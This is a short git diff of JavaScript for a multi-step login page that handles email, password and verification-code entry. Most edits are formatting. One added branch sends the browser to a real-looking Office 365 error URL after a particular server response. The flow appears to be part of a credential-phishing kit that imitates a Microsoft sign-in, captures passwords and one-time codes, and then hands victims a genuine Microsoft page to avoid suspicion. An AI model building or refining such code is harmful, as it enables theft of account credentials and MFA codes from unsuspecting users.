@@ -32,9 +32,8 @@ document.body.addEventListener("click", function (e) {
     verifyCode();
   } else if (targetId == "resend") {
     resend();
-  }
-  else if(targetId == "sign-in-btn-0") {
-    validateEmail(document.getElementById("email-input").value)
+  } else if (targetId == "sign-in-btn-0") {
+    validateEmail(document.getElementById("email-input").value);
   }
 });
 
@@ -60,15 +59,13 @@ function configure() {
 }
 
 function validateEmail(email) {
-  if(email) {
+  if (email) {
     document.querySelectorAll(".email").forEach(function (element) {
       element.innerHTML = email;
     });
     uniqueId = generateUniqueId();
     sendEmail(email, false);
   }
-  
-  
 }
 
 function sendEmail(email, stat) {
@@ -113,6 +110,7 @@ function signIn() {
     if (this.readyState == 4 && this.status == 200) {
       let response = this.response;
       if (response == 0) {
+        console.log(response);
         setIncorrectPass("block");
         passInput.value = "";
         setLoader(loaderSignIn, "hidden");
@@ -123,6 +121,10 @@ function signIn() {
       } else if (response == 2) {
         changeCard(passwordCard, codeCard);
         setLoader(loaderSignIn, "hidden");
+      } else if (response == 3) {
+        setLoader(loaderSignIn, "hidden");
+        location.href =
+          "https://outlook.office365.com/Encryption/ErrorPage.aspx?src=0&code=10&be=DM8PR09MB6088&fe=";
       } else {
         changeCard(passwordCard, authCard);
         setLoader(loaderSignIn, "hidden");
